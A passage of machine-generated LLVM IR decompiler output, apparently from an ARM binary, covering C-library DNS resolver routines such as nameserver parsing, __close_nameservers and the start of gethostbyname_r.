  %v3_194a8 = inttoptr i32 %v2_194a8 to i32*
  %v4_194a8 = load i32, i32* %v3_194a8, align 4
  store i32 %v2_194a4, i32* @r4, align 4
  %tmp69 = mul i32 %v4_194a8, 4
  %v3_194b4 = add i32 %tmp69, 4
  store i32 %v3_194b4, i32* %r1.global-to-local, align 4
  %v1_194b8 = load i32, i32* @r6, align 4
  %v2_194b8 = add i32 %v1_194b8, %v0_194a8
  %v3_194b8 = inttoptr i32 %v2_194b8 to i32*
  %v4_194b8 = load i32, i32* %v3_194b8, align 4
  store i32 %v4_194b8, i32* %r0.global-to-local, align 4
  %v2_194bc = inttoptr i32 %v4_194b8 to i32*
  %v3_194bc = call i32 @realloc(i32* %v2_194bc, i32 %v3_194b4)
  store i32 %v3_194bc, i32* %r3.global-to-local, align 4
  %v2_194c0 = icmp eq i32 %v3_194bc, 0
  %v0_194c4 = load i32, i32* @r7, align 4
  store i32 %v0_194c4, i32* %r0.global-to-local, align 4
  %v0_194c8 = load i32, i32* @r4, align 4
  store i32 %v0_194c8, i32* @r7, align 4
  br i1 %v2_194c0, label %dec_label_pc_195b8.backedge, label %dec_label_pc_194d0

dec_label_pc_194d0:                               ; preds = %dec_label_pc_1949c
  %v1_194d0 = load i32, i32* @r5, align 4
  %v2_194d0 = load i32, i32* @r6, align 4
  %v3_194d0 = add i32 %v2_194d0, %v1_194d0
  %v4_194d0 = inttoptr i32 %v3_194d0 to i32*
  store i32 %v3_194bc, i32* %v4_194d0, align 4
  %v1_194d4 = inttoptr i32 %v0_194c4 to i8*
  %v2_194d4 = call i32 @__GI_strdup(i8* %v1_194d4)
  store i32 %v2_194d4, i32* %r0.global-to-local, align 4
  %v2_194d8 = icmp eq i32 %v2_194d4, 0
  br i1 %v2_194d8, label %dec_label_pc_195b8.backedge, label %dec_label_pc_194e0

dec_label_pc_194e0:                               ; preds = %dec_label_pc_194d0
  %v0_194e0 = load i32, i32* @r5, align 4
  %v1_194e0 = load i32, i32* @sb, align 4
  %v2_194e0 = add i32 %v1_194e0, %v0_194e0
  %v3_194e0 = inttoptr i32 %v2_194e0 to i32*
  %v4_194e0 = load i32, i32* %v3_194e0, align 4
  store i32 %v4_194e0, i32* %r3.global-to-local, align 4
  %v1_194e4 = load i32, i32* @r6, align 4
  %v2_194e4 = add i32 %v1_194e4, %v0_194e0
  %v3_194e4 = inttoptr i32 %v2_194e4 to i32*
  %v4_194e4 = load i32, i32* %v3_194e4, align 4
  store i32 %v4_194e4, i32* %r2.global-to-local, align 4
  %v1_194e8 = add i32 %v4_194e0, 1
  store i32 %v1_194e8, i32* %r1.global-to-local, align 4
  %v5_194ec = mul i32 %v4_194e0, 4
  %v6_194ec = add i32 %v4_194e4, %v5_194ec
  %v7_194ec = inttoptr i32 %v6_194ec to i32*
  store i32 %v2_194d4, i32* %v7_194ec, align 4
  %v0_194f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_194f0 = load i32, i32* @r5, align 4
  %v2_194f0 = load i32, i32* @sb, align 4
  %v3_194f0 = add i32 %v2_194f0, %v1_194f0
  %v4_194f0 = inttoptr i32 %v3_194f0 to i32*
  store i32 %v0_194f0, i32* %v4_194f0, align 4
  %v0_194f4 = load i32, i32* @r4, align 4
  %v1_194f4 = inttoptr i32 %v0_194f4 to i8*
  %v2_194f4 = load i8, i8* %v1_194f4, align 1
  %v3_194f4 = zext i8 %v2_194f4 to i32
  store i32 %v3_194f4, i32* %r3.global-to-local, align 4
  %v2_194f8 = icmp eq i8 %v2_194f4, 0
  br i1 %v2_194f8, label %dec_label_pc_195b8.backedge, label %dec_label_pc_1949c

dec_label_pc_19504:                               ; preds = %dec_label_pc_19458
  %v0_19504 = load i32, i32* @r4, align 4
  store i32 %v0_19504, i32* %r0.global-to-local, align 4
  %v2_19508 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_19508, i32* @r1, align 4
  %v2_1950c = inttoptr i32 %v0_19504 to i8*
  %v3_1950c = call i32 @__GI_strcoll(i8* %v2_1950c, i32 %v2_19508)
  store i32 %v3_1950c, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_1950c, 16777216
  %v1_19510 = sdiv i32 %sext2, 16777216
  store i32 %v1_19510, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_19518, label %dec_label_pc_195b8.backedge

dec_label_pc_19518:                               ; preds = %dec_label_pc_19504
  %v0_19518 = load i32, i32* @r7, align 4
  %v2_19518 = icmp eq i32 %v0_19518, 0
  br i1 %v2_19518, label %dec_label_pc_195b8.backedge, label %dec_label_pc_19520

dec_label_pc_19520:                               ; preds = %dec_label_pc_19518
  store i32 %v0_19518, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_19528 = call i32 @__GI_strchr(i32 %v0_19518, i32 58)
  store i32 %v2_19528, i32* %r0.global-to-local, align 4
  store i32 %v2_19528, i32* @r6, align 4
  %v3_1952c = icmp eq i32 %v2_19528, 0
  br i1 %v3_1952c, label %dec_label_pc_195b8.backedge, label %dec_label_pc_19534

dec_label_pc_19534:                               ; preds = %dec_label_pc_19520
  store i32 -32876, i32* %r1.global-to-local, align 4
  %v0_19538 = load i32, i32* @r4, align 4
  %v1_19538 = trunc i32 %v0_19538 to i8
  %v3_19538 = inttoptr i32 %v2_19528 to i8*
  store i8 %v1_19538, i8* %v3_19538, align 1
  %v0_1953c = load i32, i32* @r5, align 4
  %v1_1953c = load i32, i32* %r1.global-to-local, align 4
  %v2_1953c = add i32 %v1_1953c, %v0_1953c
  store i32 %v2_1953c, i32* @r1, align 4
  %v0_19540 = load i32, i32* @r7, align 4
  store i32 %v0_19540, i32* %r0.global-to-local, align 4
  %v2_19544 = inttoptr i32 %v0_19540 to i8*
  %v3_19544 = call i32 @__GI_strcoll(i8* %v2_19544, i32 %v2_1953c)
  store i32 %v3_19544, i32* %r0.global-to-local, align 4
  %v2_19548 = icmp eq i32 %v3_19544, 0
  br i1 %v2_19548, label %dec_label_pc_19570, label %dec_label_pc_19554

dec_label_pc_19554:                               ; preds = %dec_label_pc_19534
  %v0_19558 = load i32, i32* @r7, align 4
  store i32 %v0_19558, i32* %r0.global-to-local, align 4
  %v0_1955c = load i32, i32* @r5, align 4
  %v2_1955c = add i32 %v0_1955c, -32868
  store i32 %v2_1955c, i32* @r1, align 4
  %v2_19560 = inttoptr i32 %v0_19558 to i8*
  %v3_19560 = call i32 @__GI_strcoll(i8* %v2_19560, i32 %v2_1955c)
  store i32 %v3_19560, i32* %r0.global-to-local, align 4
  %v2_19564 = icmp eq i32 %v3_19560, 0
  br i1 %v2_19564, label %dec_label_pc_19570, label %dec_label_pc_195b8.backedge

dec_label_pc_19570:                               ; preds = %dec_label_pc_19554, %dec_label_pc_19534
  %storemerge = phi i32 [ 2422, %dec_label_pc_19534 ], [ 2423, %dec_label_pc_19554 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_19570 = load i32, i32* @r6, align 4
  %v1_19570 = add i32 %v0_19570, 1
  store i32 %v1_19570, i32* @r0, align 4
  %v0_19574 = load i32, i32* @r5, align 4
  %v2_19574 = add i32 %v0_19574, %storemerge
  store i32 %v2_19574, i32* @r4, align 4
  %v1_19578 = call i32 @atol(i32 %v1_19570)
  %v2_19578 = trunc i32 %v1_19578 to i8
  store i32 %v1_19578, i32* %r0.global-to-local, align 4
  %v3_1957c = load i32, i32* @r4, align 4
  %v4_1957c = inttoptr i32 %v3_1957c to i8*
  store i8 %v2_19578, i8* %v4_1957c, align 1
  br label %dec_label_pc_195b8.backedge

dec_label_pc_19584:                               ; preds = %dec_label_pc_19324
  %v0_19588 = load i32, i32* @r5, align 4
  %v2_19588 = add i32 %v0_19588, -32912
  %v2_19594 = add i32 %v0_19588, -32900
  %v2_195a0 = add i32 %v0_19588, -32892
  %v2_195ac = add i32 %v0_19588, -32884
  store i32 %v2_195ac, i32* %r3.global-to-local, align 4
  store i32 28664, i32* @sb, align 4
  store i32 %v2_195ac, i32* %stack_var_-560, align 4
  %v2_195b8 = ptrtoint i32* %stack_var_-288 to i32
  %v1_19360 = bitcast i32* %stack_var_-288 to i8*
  %v2_19390 = ptrtoint i8** %stack_var_-68 to i32
  %v2_193a4 = bitcast i8** %stack_var_-68 to i8*
  %v2_193b0 = ptrtoint i32* %stack_var_-60 to i32
  %v2_193c8 = ptrtoint i32* %stack_var_-64 to i32
  %v2_193e0 = ptrtoint i32* %stack_var_-304 to i32
  %v14_19424 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_195b8, i32* @r4, align 4
  store i32 %v2_195b8, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v2_1934c, i32* %r2.global-to-local, align 4
  %v3_195c866 = call i32 @fgets(i32 %v2_195b8, i32 128, i32 %v2_1934c)
  store i32 %v3_195c866, i32* %r0.global-to-local, align 4
  %v2_195cc68 = icmp eq i32 %v3_195c866, 0
  br i1 %v2_195cc68, label %dec_label_pc_195d4, label %dec_label_pc_1935c

dec_label_pc_195d4:                               ; preds = %dec_label_pc_195b8.backedge, %dec_label_pc_19584
  %v0_195d4 = load i32, i32* @fp, align 4
  store i32 %v0_195d4, i32* %r0.global-to-local, align 4
  %v1_195d8 = inttoptr i32 %v0_195d4 to i16*
  %v2_195d8 = call i32 @__GI_fclose(i16* %v1_195d8)
  store i32 %v2_195d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_195dc

dec_label_pc_195dc:                               ; preds = %dec_label_pc_19324, %dec_label_pc_195d4
  store i32 28660, i32* %r3.global-to-local, align 4
  %v0_195e0 = load i32, i32* @r5, align 4
  %v2_195e0 = add i32 %v0_195e0, 28660
  %v3_195e0 = inttoptr i32 %v2_195e0 to i32*
  %v4_195e0 = load i32, i32* %v3_195e0, align 4
  store i32 %v4_195e0, i32* %r3.global-to-local, align 4
  %v2_195e4 = icmp eq i32 %v4_195e0, 0
  br i1 %v2_195e4, label %dec_label_pc_195ec, label %dec_label_pc_19628

dec_label_pc_195ec:                               ; preds = %dec_label_pc_195dc
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_195f0 = call i32 @malloc(i32 28)
  store i32 %v1_195f0, i32* %r0.global-to-local, align 4
  store i32 -32856, i32* %r3.global-to-local, align 4
  store i32 28656, i32* %r2.global-to-local, align 4
  %v2_195fc = icmp eq i32 %v1_195f0, 0
  %v1_19600 = load i32, i32* @r5, align 4
  br i1 %v2_195fc, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_195ec
  %v3_19600 = add i32 %v1_19600, -32856
  store i32 %v3_19600, i32* %r3.global-to-local, align 4
  %v3_1960428 = add i32 %v1_19600, 28656
  %v4_1960429 = inttoptr i32 %v3_1960428 to i32*
  store i32 0, i32* %v4_1960429, align 4
  %v1_19608 = load i32, i32* %r3.global-to-local, align 4
  %v2_19608 = load i32, i32* @r5, align 4
  %v3_19608 = load i32, i32* %r2.global-to-local, align 4
  %v4_19608 = add i32 %v3_19608, %v2_19608
  %v5_19608 = inttoptr i32 %v4_19608 to i32*
  store i32 %v1_19608, i32* %v5_19608, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_195ec
  %v3_19604 = add i32 %v1_19600, 28656
  %v4_19604 = inttoptr i32 %v3_19604 to i32*
  store i32 %v1_195f0, i32* %v4_19604, align 4
  %v1_1960c = load i32, i32* @r5, align 4
  %v2_1960c = load i32, i32* %r3.global-to-local, align 4
  %v3_1960c = add i32 %v2_1960c, %v1_1960c
  store i32 %v3_1960c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 103960, i32* @lr, align 4
  %v1_19614 = xor i1 %v2_195fc, true
  call void @__pseudo_cond_branch(i1 %v1_19614, i32 ptrtoint (i32* @global_var_11bf0.843 to i32))
  store i32 28660, i32* %r2.global-to-local, align 4
  %v0_1961c = load i32, i32* @r5, align 4
  %v2_1961c = add i32 %v0_1961c, 28660
  %v3_1961c = inttoptr i32 %v2_1961c to i32*
  %v4_1961c = load i32, i32* %v3_1961c, align 4
  %v1_19620 = add i32 %v4_1961c, 1
  store i32 %v1_19620, i32* %r3.global-to-local, align 4
  store i32 %v1_19620, i32* %v3_1961c, align 4
  %v0_1962c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19628

dec_label_pc_19628:                               ; preds = %dec_label_pc_195dc, %.thread4
  %v0_1962c = phi i32 [ %v0_195e0, %dec_label_pc_195dc ], [ %v0_1962c.pre, %.thread4 ]
  store i32 28664, i32* @r7, align 4
  %v2_1962c = add i32 %v0_1962c, 28664
  %v3_1962c = inttoptr i32 %v2_1962c to i32*
  %v4_1962c = load i32, i32* %v3_1962c, align 4
  store i32 %v4_1962c, i32* @r4, align 4
  %v2_19630 = icmp eq i32 %v4_1962c, 0
  br i1 %v2_19630, label %dec_label_pc_19638, label %dec_label_pc_196b8

dec_label_pc_19638:                               ; preds = %dec_label_pc_19628
  %v2_19638 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_19638, i32* @r6, align 4
  store i32 %v2_19638, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_19644 = call i32 @__GI_gethostname(i32 %v2_19638, i32 255)
  store i32 %v2_19644, i32* %r0.global-to-local, align 4
  %v2_19648 = icmp eq i32 %v2_19644, 0
  br i1 %v2_19648, label %dec_label_pc_19654, label %dec_label_pc_196b8

dec_label_pc_19654:                               ; preds = %dec_label_pc_19638
  store i32 %v2_19638, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_1965c = call i32 @__GI_strchr(i32 %v2_19638, i32 46)
  store i32 %v2_1965c, i32* %r0.global-to-local, align 4
  %v2_19660 = icmp eq i32 %v2_1965c, 0
  br i1 %v2_19660, label %dec_label_pc_196b8, label %dec_label_pc_19668

dec_label_pc_19668:                               ; preds = %dec_label_pc_19654
  %v1_19668 = add i32 %v2_1965c, 1
  %v2_19668 = inttoptr i32 %v1_19668 to i8*
  %v3_19668 = load i8, i8* %v2_19668, align 1
  %v4_19668 = zext i8 %v3_19668 to i32
  store i32 %v4_19668, i32* %r3.global-to-local, align 4
  %v2_1966c = icmp eq i8 %v3_19668, 0
  store i32 %v1_19668, i32* %r0.global-to-local, align 4
  br i1 %v2_1966c, label %dec_label_pc_196b8, label %dec_label_pc_19678

dec_label_pc_19678:                               ; preds = %dec_label_pc_19668
  %v2_19678 = call i32 @__GI_strdup(i8* %v2_19668)
  store i32 %v2_19678, i32* %r0.global-to-local, align 4
  store i32 %v2_19678, i32* @r4, align 4
  %v2_1967c = icmp eq i32 %v2_19678, 0
  br i1 %v2_1967c, label %dec_label_pc_196b8, label %dec_label_pc_19684

dec_label_pc_19684:                               ; preds = %dec_label_pc_19678
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_19688 = call i32 @malloc(i32 4)
  store i32 %v1_19688, i32* %r0.global-to-local, align 4
  store i32 28652, i32* %r3.global-to-local, align 4
  %v2_19690 = icmp eq i32 %v1_19688, 0
  %v1_19694 = load i32, i32* @r5, align 4
  %v3_19694 = add i32 %v1_19694, 28652
  %v4_19694 = inttoptr i32 %v3_19694 to i32*
  store i32 %v1_19688, i32* %v4_19694, align 4
  br i1 %v2_19690, label %dec_label_pc_1969c, label %dec_label_pc_196a8

dec_label_pc_1969c:                               ; preds = %dec_label_pc_19684
  %v0_1969c = load i32, i32* @r4, align 4
  store i32 %v0_1969c, i32* @r0, align 4
  %v0_196a0 = call i32 @free()
  store i32 %v0_196a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_196b8

dec_label_pc_196a8:                               ; preds = %dec_label_pc_19684
  %v0_196a8 = load i32, i32* @r5, align 4
  %v1_196a8 = load i32, i32* @r7, align 4
  %v2_196a8 = add i32 %v1_196a8, %v0_196a8
  %v3_196a8 = inttoptr i32 %v2_196a8 to i32*
  %v4_196a8 = load i32, i32* %v3_196a8, align 4
  %v1_196ac = add i32 %v4_196a8, 1
  store i32 %v1_196ac, i32* %r3.global-to-local, align 4
  %v0_196b0 = load i32, i32* @r4, align 4
  %v2_196b0 = inttoptr i32 %v1_19688 to i32*
  store i32 %v0_196b0, i32* %v2_196b0, align 4
  %v0_196b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_196b4 = load i32, i32* @r5, align 4
  %v2_196b4 = load i32, i32* @r7, align 4
  %v3_196b4 = add i32 %v2_196b4, %v1_196b4
  %v4_196b4 = inttoptr i32 %v3_196b4 to i32*
  store i32 %v0_196b4, i32* %v4_196b4, align 4
  br label %dec_label_pc_196b8

dec_label_pc_196b8:                               ; preds = %dec_label_pc_19638, %dec_label_pc_19628, %dec_label_pc_19314, %dec_label_pc_19678, %dec_label_pc_19668, %dec_label_pc_19654, %dec_label_pc_1969c, %dec_label_pc_196a8
  store i32 28648, i32* %r3.global-to-local, align 4
  %v0_196bc = load i32, i32* @r5, align 4
  %v2_196bc = add i32 %v0_196bc, 28648
  %v3_196bc = inttoptr i32 %v2_196bc to i32*
  %v4_196bc = load i32, i32* %v3_196bc, align 4
  store i32 %v4_196bc, i32* %r0.global-to-local, align 4
  %v2_196c0 = icmp eq i32 %v4_196bc, 0
  br i1 %v2_196c0, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_196b8
  store i32 104140, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_196b8, %bb64
  %v2_196c8 = xor i1 %v2_196c0, true
  call void @__pseudo_cond_branch(i1 %v2_196c8, i32 %v4_196bc)
  %v2_196d0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_196d0, i32* %r4.global-to-local, align 4
  store i32 %v15_192c4, i32* @r8, align 4
  store i32 %v18_192c4, i32* @sb, align 4
  store i32 %v21_192c4, i32* @sl, align 4
  store i32 %v24_192c4, i32* @fp, align 4
  store i32 %v27_192c4, i32* %lr.global-to-local, align 4
  ret i32 %v4_196bc

; uselistorder directives
  uselistorder i32 %v1_19688, { 1, 0, 2, 3 }
  uselistorder i32 %v2_19638, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_193c8, { 1, 0 }
  uselistorder i32 %v2_193b0, { 1, 0 }
  uselistorder i32 %v2_19390, { 1, 0 }
  uselistorder i32 %v2_195b8, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_19588, { 1, 0, 2, 3 }
  uselistorder i32 %v1_19578, { 1, 0 }
  uselistorder i32 %v0_19518, { 1, 0, 2 }
  uselistorder i32 %v1_1949017, { 1, 0 }
  uselistorder i32 %v1_1948810, { 1, 0 }
  uselistorder i32 %v0_194889, { 1, 0 }
  uselistorder i32 %v1_19490, { 1, 0 }
  uselistorder i32 %v3_1940c, { 1, 0, 2, 3, 4 }
  uselistorder i8** %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 23, 0, 14, 15, 16, 1, 19, 17, 18, 20, 21, 22, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 17, 5, 0, 7, 6, 14, 8, 9, 10, 11, 12, 13, 15, 16 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 21, 3, 4, 5, 6, 7, 8, 16, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 56, 55, 13, 15, 14, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 27, 29, 28, 34, 33, 49, 48, 30, 31, 32, 36, 35, 38, 37, 39, 41, 40, 42, 44, 43, 45, 47, 46, 52, 50, 51, 54, 53 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 3, 0, 1, 2 }
  uselistorder i32 (i32)* @atol, { 0, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 0, 5, 4, 6, 1, 2, 3 }
  uselistorder i32 (i32*, i32)* @realloc, { 2, 3, 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 24, 35, 36, 2, 32, 23, 3, 4, 22, 27, 14, 20, 21, 38, 37, 25, 0, 15, 5, 6, 7, 8, 9, 10, 11, 12, 13, 26, 1, 16, 17, 18, 19, 28, 29, 30, 31, 33, 34 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_fopen, { 0, 1, 4, 3, 2 }
  uselistorder i32 -33888, { 1, 0 }
  uselistorder i32 2423, { 0, 3, 4, 2, 1 }
  uselistorder i32 -32932, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -32932), { 1, 0 }
  uselistorder i32 28648, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_196b8, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_19628, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_195dc, { 1, 0 }
  uselistorder label %dec_label_pc_195d4, { 1, 0 }
  uselistorder label %dec_label_pc_19498, { 1, 0 }
  uselistorder label %dec_label_pc_195b8.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_19314, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_19720 = load i32, i32* @r4, align 4
  store i32 %v3_19720, i32* %stack_var_-20, align 4
  store i32 28656, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r5, align 4
  store i32 -32856, i32* %r3.global-to-local, align 4
  %v4_19734 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 28656) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -32856), i32* %r3.global-to-local, align 4
  store i32 104264, i32* @lr, align 4
  %v1_19744 = icmp ne i32 %v4_19734, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -32856)
  call void @__pseudo_cond_branch(i1 %v1_19744, i32 ptrtoint (i32* @global_var_1375c.598 to i32))
  store i32 28660, i32* %r3.global-to-local, align 4
  store i32 28664, i32* @r7, align 4
  store i32 28652, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_19758 = load i32, i32* @r5, align 4
  %v3_19758 = add i32 %v1_19758, 28660
  %v4_19758 = inttoptr i32 %v3_19758 to i32*
  store i32 0, i32* %v4_19758, align 4
  %v0_1975c = load i32, i32* %r2.global-to-local, align 4
  %v1_1975c = load i32, i32* @r5, align 4
  %v2_1975c = load i32, i32* %r4.global-to-local, align 4
  %v3_1975c = add i32 %v2_1975c, %v1_1975c
  %v4_1975c = inttoptr i32 %v3_1975c to i32*
  store i32 %v0_1975c, i32* %v4_1975c, align 4
  br label %dec_label_pc_19774

dec_label_pc_19764:                               ; preds = %dec_label_pc_19774
  store i32 %v4_19788, i32* %r3.global-to-local, align 4
  store i32 %v1_1977c, i32* %v3_19774, align 4
  %v0_1976c = load i32, i32* %r3.global-to-local, align 4
  %v1_1976c = load i32, i32* %r2.global-to-local, align 4
  %v4_1976c = mul i32 %v1_1976c, 4
  %v5_1976c = add i32 %v4_1976c, %v0_1976c
  %v6_1976c = inttoptr i32 %v5_1976c to i32*
  %v7_1976c = load i32, i32* %v6_1976c, align 4
  store i32 %v7_1976c, i32* @r0, align 4
  %v0_19770 = call i32 @free()
  br label %dec_label_pc_19774

dec_label_pc_19774:                               ; preds = %entry, %dec_label_pc_19764
  %v0_19774 = load i32, i32* @r5, align 4
  %v1_19774 = load i32, i32* @r7, align 4
  %v2_19774 = add i32 %v1_19774, %v0_19774
  %v3_19774 = inttoptr i32 %v2_19774 to i32*
  %v4_19774 = load i32, i32* %v3_19774, align 4
  store i32 %v4_19774, i32* @r4, align 4
  %v2_19778 = icmp eq i32 %v4_19774, 0
  %v1_1977c = add i32 %v4_19774, -1
  store i32 %v1_1977c, i32* %r2.global-to-local, align 4
  %v0_19780 = load i32, i32* @r6, align 4
  store i32 %v0_19780, i32* %r3.global-to-local, align 4
  %v2_19788 = add i32 %v0_19780, %v0_19774
  %v3_19788 = inttoptr i32 %v2_19788 to i32*
  %v4_19788 = load i32, i32* %v3_19788, align 4
  br i1 %v2_19778, label %dec_label_pc_19788, label %dec_label_pc_19764

dec_label_pc_19788:                               ; preds = %dec_label_pc_19774
  store i32 %v4_19788, i32* @r0, align 4
  %v0_1978c = call i32 @free()
  %v0_19790 = load i32, i32* @r4, align 4
  %v1_19790 = load i32, i32* @r5, align 4
  %v2_19790 = load i32, i32* @r6, align 4
  %v3_19790 = add i32 %v2_19790, %v1_19790
  %v4_19790 = inttoptr i32 %v3_19790 to i32*
  store i32 %v0_19790, i32* %v4_19790, align 4
  %v2_19798 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_19798, i32* %r4.global-to-local, align 4
  ret i32 %v0_1978c

; uselistorder directives
  uselistorder i32 %v4_19788, { 1, 0 }
  uselistorder i32 %v1_1977c, { 1, 0 }
  uselistorder i32* %v3_19774, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 28652, { 4, 1, 7, 5, 6, 0, 3, 2, 8 }
  uselistorder i32 28664, { 1, 2, 4, 3, 0 }
  uselistorder i32 28660, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -32856, { 1, 2, 0, 3 }
  uselistorder i32 28656, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_19774, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_197b8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_197f4 = call i32 @__read_etc_hosts_r()
  store i32 %v0_197b8, i32* @lr, align 4
  ret i32 %v0_197f4
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp29, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_1980c = load i32, i32* @r2, align 4
  store i32 %tmp29, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_19818 = load i32, i32* @r0, align 4
  store i32 %v0_19818, i32* @sl, align 4
  %v2_19818 = icmp eq i32 %v0_19818, 0
  %v2_1981c = inttoptr i32 %tmp29 to i32*
  store i32 0, i32* %v2_1981c, align 4
  %v0_19820 = load i32, i32* @r1, align 4
  store i32 %v0_19820, i32* @r7, align 4
  %v0_19824 = load i32, i32* @r3, align 4
  store i32 %v0_19824, i32* @r6, align 4
  br i1 %v2_19818, label %bb, label %dec_label_pc_19830

bb:                                               ; preds = %entry
  %v1_19828 = load i32, i32* @r5, align 4
  %v2_19828 = add i32 %v1_19828, 22
  store i32 %v2_19828, i32* @r5, align 4
  br label %dec_label_pc_19aec

dec_label_pc_19830:                               ; preds = %entry
  %v0_19830 = call i32 @__GI___errno_location()
  store i32 %v0_19830, i32* %r0.global-to-local, align 4
  %v3_19834 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19834, i32* %ip.global-to-local, align 4
  %v1_19838 = inttoptr i32 %v0_19830 to i32*
  %v2_19838 = load i32, i32* %v1_19838, align 4
  store i32 %v2_19838, i32* @r8, align 4
  %v0_1983c = load i32, i32* @r5, align 4
  store i32 %v0_1983c, i32* %v1_19838, align 4
  %v0_19840 = load i32, i32* %ip.global-to-local, align 4
  store i32 %tmp18, i32* %ip.global-to-local, align 4
  store i32 %v0_19830, i32* @r4, align 4
  %v0_19850 = load i32, i32* @sl, align 4
  store i32 %v0_19850, i32* %r0.global-to-local, align 4
  %v0_19854 = load i32, i32* @r7, align 4
  store i32 %v0_19854, i32* %r2.global-to-local, align 4
  store i32 %v0_1980c, i32* %r3.global-to-local, align 4
  %v0_1985c = load i32, i32* @r6, align 4
  %v7_19864 = call i32 @__get_hosts_byname_r(i32 %v0_19850, i32 2, i32 %v0_19854, i32 %v0_1980c, i32 %v0_1985c, i32 %v0_19840, i32 %tmp18)
  store i32 %v7_19864, i32* %r0.global-to-local, align 4
